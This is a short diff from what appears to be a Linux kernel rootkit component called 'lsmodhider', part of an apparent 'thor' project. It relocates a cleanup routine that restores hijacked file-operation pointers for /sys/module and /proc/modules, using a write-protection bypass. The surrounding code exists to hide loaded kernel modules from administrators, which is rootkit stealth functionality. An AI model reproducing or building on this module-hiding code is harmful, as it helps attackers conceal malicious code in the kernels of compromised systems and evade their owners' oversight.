@@ -96,6 +96,25 @@ int lsmodhider_init(void)
     return 0;
 }
 
+void lsmodhider_cleanup(void)
+{
+    if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
+         void *sysmodule_iterate_addr = orig_sysmodule_iterate;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+        write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
+#else
+        write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
+#endif
+    }
+
+    if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
+        void *procmodules_read_addr = orig_procmodules_read;
+        write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
+    }
+
+    clear_module_list();
+}
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
 static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
@@ -219,23 +238,3 @@ void clear_module_list(void)
         kfree(tmp);
     }
 }
-
-void lsmodhider_cleanup(void)
-{
-    if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
-         void *sysmodule_iterate_addr = orig_sysmodule_iterate;
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-        write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
-#else
-        write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
-#endif
-    }
-
-    if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
-        void *procmodules_read_addr = orig_procmodules_read;
-        write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
-    }
-
-    clear_module_list();
-}
-
